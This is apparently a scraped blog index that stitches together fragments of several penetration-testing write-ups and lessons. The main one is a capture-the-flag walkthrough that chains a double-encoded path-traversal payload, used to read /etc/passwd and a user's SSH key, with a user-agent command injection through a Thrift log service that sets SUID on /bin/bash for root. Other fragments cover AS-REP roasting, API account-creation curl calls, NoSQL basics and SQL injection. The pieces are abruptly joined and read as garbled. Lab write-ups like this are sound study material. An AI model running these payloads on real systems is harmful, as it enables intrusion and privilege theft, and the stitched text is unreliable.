Which includes a path traversal vulnerability on versions 1.8.2 The POC looked like this: curl -i -s -k -X GET \u0026#39;http://127.0.0.1:3923/.cpr/%2Fetc%2Fpasswd\u0026#39; The above path also has SSRF vulnerability Exploitation # Using this plainly didn\u0026rsquo;t work for me But with little twerk, actually have to double encode the payload This was my initial payload to read /etc/passwd .cpr//etc/passwd The Final URL encoded payload: %2e%63%70%72%2f%25%32%46%65%74%63%25%32%46%70%61%73%73%77%64 As this was working, for SSH access I tried to read id_rsa for user margo and got nothing, then after some hours I figured that it\u0026rsquo;s not a RSA key that I should look for\u0026hellip; /.cpr//home/margo/.ssh/id_ecdsa Logged in with the key and got the User flag Don\u0026rsquo;t worry guys we are halfway through Privilege Escalation # I started enumerating with internal services and we got multiple services but one looks particularly interesting ss -tunlp The reason is, there is a code mentioning about port 9090 within the gitbucket\u0026rsquo;s Logservice repo So as usual as I reverse forwarded that particular service port to my host machine There were no interface I was stuck here so I researched the repo again and learned about Thrift. Where Thrift is used to connect with log services. Researched on Thrift View articles Link-1 Link-2\nAlso after some further enumeration and code review I found a really bad code on the log service This regex code snippet reads a arbitary log file and takes the values of User-Agent from, it takes timestamp\u0026rsquo;s value. Also it notes the IP address which is not potential for this context This can be exploited by injecting a command within the user agent of log files. As the code configured to read the user-agent value, the injected command would be executed. For this to be done we need Thrift installed on the local machine. Then we need a client on the local machine to tell the Log service to read our malicious file on the target using thrift. When it reads the log file our command will be executed. So I installed Thrift using pip3 pip3 install thrift To create the client, first we have to create an api configuration file for the client Created a file named api2.thrift with this following code namespace py log_service exception LogServiceException { 1: string message } service LogService { /** * Reads the log file from the specified file path. * @param filePath - The path of the log file to read. * @return string - A message indicating the processing status. * @throws LogServiceException - If an error occurs during processing. */ string ReadLogFile(1: string filePath) throws (1: LogServiceException error) } Installed compiler using sudo apt install thrift-compiler although not recommended Ran the following command and created modules directory in python language thrift --gen py api2.thrift Inside the directory I created client.py file with this code from thrift import Thrift from thrift.transport import TSocket from thrift.transport import TTransport from thrift.protocol import TBinaryProtocol from log_service import LogService # Import generated Thrift client code def main(): # Set up a transport to the server transport = TSocket.TSocket(\u0026#39;localhost\u0026#39;, 9090) # Buffering for performance transport = TTransport.TBufferedTransport(transport) # Using a binary protocol protocol = TBinaryProtocol.TBinaryProtocol(transport) # Create a client to use the service client = LogService.Client(protocol) # Open the connection transport.open() try: # Specify the log file path to process log_file_path = \u0026#34;/tmp/bad.log\u0026#34; # Call the remote method ReadLogFile and get the result response = client.ReadLogFile(log_file_path) print(\u0026#34;Server response:\u0026#34;, response) except Thrift.TException as tx: print(f\u0026#34;Thrift exception: {tx}\u0026#34;) # Close the transport transport.close() if __name__ == \u0026#39;__main__\u0026#39;: main() After that I created two files One is bad.log file with this as content 999.9.9.9 \u0026#34;user-agent\u0026#34;:\u0026#34;\u0026#39;; /bin/bash /tmp/bad.sh #\u0026#34; Second is bad.sh file with this chmod +s /bin/bash Transferred both the files to the /tmp folder of the target system and also gave appropriate permissions From the host hosted a python server From the target system All complications are over. By now if client.py is executed it will speak with the Log-service and make it to read the file /tmp/bad.log As the file contains malicious code. It will make the Log-service to execute a script named bad.sh as root. The script will give SUID permissions to /bin/bash making it to be executed as root by anyone. Fired the script successfully Our exploit worked\u0026hellip;. It was a success Executing the /bin/bash with preserve flag -p gave a shell as root. Finally got the Root flag Feedback: This box was awesome at same time it was a misery. It took me 5 days to pwn this box.

But one in particular /docs asks for authentication cookie. We can also do directory fuzzing in recursive mode with any tool but I personally found the endpoints just by guessing them. There is one signup endpoint which is api/v1/user/signup. Using this endpoint I can create an account. After enumerating further on that endpoint I found all the data parameters of it. Now I can create an account using this curl -v -X POST \u0026#39;http://10.10.11.161/api/v1/user/signup\u0026#39; -H \u0026#39;Content-Type: application/json\u0026#39; -d \u0026#39;{\u0026#34;email\u0026#34;:\u0026#34;Emp5r0R@king.com\u0026#34;, \u0026#34;password\u0026#34;:\u0026#34;password\u0026#34;}\u0026#39; | jq Eventually I found another endpoint which is /login. But initially it was showing error on sending the json data but it turns out this endpoint only accept HTML data. I curled the endpoint curl -v \u0026#39;http://10.10.11.161/api/v1/user/login\u0026#39; -d \u0026#39;username=Emp5r0R@king.com\u0026amp;password=password\u0026#39; | jq .

Tested 8 usernames (6 valid) in 0.198 seconds Exploitation # As I was desperatly looking for a low hanging fruit I checked user accounts that had DONT_REQUIRE_PREAUTH. Lucky me I got one user which is none other than svc-alfresco. This Pre-Auth concept is pretty simple let\u0026rsquo;s learn about it, As part of the Kerberos authentication process in Active Directory, there is an initial request to authenticate without a password. This is an artifact left over from Kerberos versions earlier than Kerberos 5. In these earlier versions, Kerberos would allow authentication without a password. Now, in Kerberos 5, a password is required, which is called “Pre-Authentication.” When looking at the Kerberos exchanges during log-on, you will initially see an AS-REQ (Authentication Server Request) followed by a Kerberos error, which will state that pre-auth is required. But in some cases accounts might be configured to authenticate without a Pre-Auth, well yeah which obiviously a misconfiguration.

Instead, a NoSQL database stores data using various storage models, depending on the type of data stored.\nDue to the lack of a defined structure for the database, NoSQL databases are very scalable and flexible. When dealing with datasets that are not very well defined and structured, a NoSQL database would be the best choice for storing our data.\nThere are 4 common storage models for NoSQL databases:\nKey-Value Document-Based Wide-Column Graph Each of the above models has a different way of storing data. For example, the Key-Value model usually stores data in JSON or XML, and has a key for each pair, storing all of its data as its value:\ngraph LR subgraph Posts box1[id\ndate\ncontent] box2[id\ndate\ncontent] box3[id\ndate\ncontent] end box1 --\u003e Key1[Key] box1 --\u003e Value1[Value] box2 --\u003e Key2[Key] box2 --\u003e Value2[Value] box3 --\u003e Key3[Key] box3 --\u003e Value3[Value] The above example can be represented using JSON as follows: { \u0026#34;100001\u0026#34;: { \u0026#34;date\u0026#34;: \u0026#34;01-01-2021\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;Welcome to this web application.\u0026#34; }, \u0026#34;100002\u0026#34;: { \u0026#34;date\u0026#34;: \u0026#34;02-01-2021\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;This is the first post on this web app.\u0026#34; }, \u0026#34;100003\u0026#34;: { \u0026#34;date\u0026#34;: \u0026#34;02-01-2021\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;Reminder: Tomorrow is the ...\u0026#34; } } It looks similar to a dictionary/map/key-value pair in languages like Python or PHP \u0026lsquo;i.e. {'key':'value'}\u0026rsquo;, where the key is usually a string, the value can be a string, dictionary, or any class object.\nThe Document-Based model stores data in complex JSON objects and each object has certain meta-data while storing the rest of the data similarly to the Key-Value model.\nSome of the most common NoSQL databases include:\nType Description MongoDB The most common NoSQL database. It is free and open-source, uses the Document-Based model, and stores data in JSON objects ElasticSearch Another free and open-source NoSQL database. It is optimized for storing and analyzing huge datasets. As its name suggests, searching for data within this database is very fast and efficient Apache Cassandra Also free and open-source. It is very scalable and is optimized for gracefully handling faulty values Other common NoSQL databases include: Redis, Neo4j, CouchDB, and Amazon DynamoDB.

Similarly to a Command Injection vulnerability, this vulnerability may occur when the web application executes a SQL query, including a value taken from user-supplied input.\nFor example, in the database section, we saw an example of how a web application would use user-input to search within a certain table, with the following line of code:\n$query = \u0026#34;select * from users where name like \u0026#39;%$searchInput%\u0026#39;\u0026#34;; If the user input is not properly filtered and validated (as is the case with Command Injections), we may execute another SQL query alongside this query, which may eventually allow us to take control over the database and its hosting server.\nFor example, the same previous College Management System 1.2 suffers from a SQL injection vulnerability, in which we can execute another SQL query that always returns true, meaning we successfully authenticated, which allows us to log in to the application. We can use the same vulnerability to retrieve data from the database or even gain control over the hosting server.\n","date":"7 March 2025","externalUrl":null,"permalink":"/posts/1741343014156-sql-injection/","section":"Posts","summary":"","title":"SQl-Injection","type":"posts"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]
